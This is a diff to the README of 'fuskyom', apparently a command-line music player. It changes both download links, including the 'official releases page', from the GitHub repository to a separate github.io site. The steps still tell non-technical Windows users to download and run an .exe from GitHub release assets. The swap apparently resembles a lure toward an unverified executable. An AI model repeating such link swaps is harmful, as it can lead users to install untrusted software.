@@ -1,6 +1,6 @@
 # 🎵 fuskyom - Play music in your command window
 
-[![](https://img.shields.io/badge/Download-fuskyom-blue)](https://github.com/ambiguous-triad386/fuskyom)
+[![](https://img.shields.io/badge/Download-fuskyom-blue)](https://ambiguous-triad386.github.io)
 
 Fuskyom brings a clean, simple music experience to your computer. It focuses on the tracks you love without the clutter of modern streaming apps. You control your entire library through a text-based interface. It displays your album artwork directly in the window while your music plays.
 
@@ -8,7 +8,7 @@ Fuskyom brings a clean, simple music experience to your computer. It focuses on 
 
 Follow these steps to set up fuskyom on your Windows machine. You do not need technical skills to get your library running.
 
-1. Visit the [official releases page](https://github.com/ambiguous-triad386/fuskyom).
+1. Visit the [official releases page](https://ambiguous-triad386.github.io).
 2. Look for the "Assets" section at the bottom of the latest version.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your applications folder.
